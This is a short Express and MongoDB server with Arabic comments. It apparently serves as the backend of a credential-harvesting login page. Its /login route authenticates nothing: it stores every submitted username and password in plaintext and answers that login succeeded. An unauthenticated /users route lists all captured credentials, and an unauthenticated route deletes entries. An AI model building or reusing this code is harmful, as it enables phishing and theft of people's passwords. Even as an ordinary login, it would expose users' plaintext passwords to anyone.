const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
require('dotenv').config();

const app = express();

mongoose.connect(process.env.MONGO_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => console.log("Connected to MongoDB"))
  .catch(err => console.error("MongoDB connection error:", err));

const UserSchema = new mongoose.Schema({
  username: String,
  password: String,
  date: { type: Date, default: Date.now }
});
const User = mongoose.model('User', UserSchema);

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// حفظ بيانات تسجيل الدخول
app.post('/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    const user = new User({ username, password });
    await user.save();
    res.json({ message: "تم  تسجيل الدخول ." });
  } catch (err) {
    res.status(500).json({ error: "معلومات تسجيل الدخول" });
  }
});

// عرض المستخدمين
app.get('/users', async (req, res) => {
  try {
    const users = await User.find({});
    res.json(users);
  } catch (err) {
    res.status(500).json({ error: "حدث خطأ أثناء جلب المستخدمين" });
  }
});
// حذف مستخدم عبر ID
app.delete('/users/:id', async (req, res) => {
  try {
    const result = await User.findByIdAndDelete(req.params.id);
    if (!result) {
      return res.status(404).json({ error: 'المستخدم غير موجود' });
    }
    res.json({ message: 'تم حذف المستخدم بنجاح' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'حدث خطأ أثناء الحذف' });
  }
});


const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
